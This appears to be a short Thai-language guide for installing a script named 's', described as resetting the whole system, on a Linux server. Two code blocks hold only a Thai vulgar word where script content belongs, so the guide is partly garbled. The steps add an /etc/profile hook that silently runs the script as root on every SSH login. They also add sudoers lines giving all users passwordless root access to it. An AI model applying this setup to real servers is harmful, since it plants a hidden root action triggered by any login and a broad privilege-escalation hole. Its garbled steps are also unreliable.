#1.ติดตั้งสคริปในโปรเจคก่อน
```
 ควย
```
#2.เข้าไปที่ cd /bin แล้วว่าเขียนgใส่ อย่าลืมพวกชื่อเชิฟที่อยู่ด้วย
#สำหรับต่อกับtermux
```
 ควย
```
#3.เข้าไปที่ cd /usr/local/bin แล้ววางสคริปs สำหรับรีระบบทั้งหมด 
```
 chmod +x s
```
#4.เข้าไปที่
```
nano /etc/profile/
```
#แล้วว่างบนสุด
```
  if [ -n "$SSH_CONNECTION" ]; then
    sudo /usr/local/bin/s > /dev/null 2>&1
fi
```
#5. เข้าไปแก้สิทธิ์ 
```
 sudo visudo
```
#ล่างสุดแล้วว่าง
```
 ALL ALL=(ALL) NOPASSWD: /usr/local/bin/s
news ALL=(ALL) NOPASSWD: /usr/local/bin/s
ubuntu ALL=(ALL) NOPASSWD: /usr/local/bin/s
```
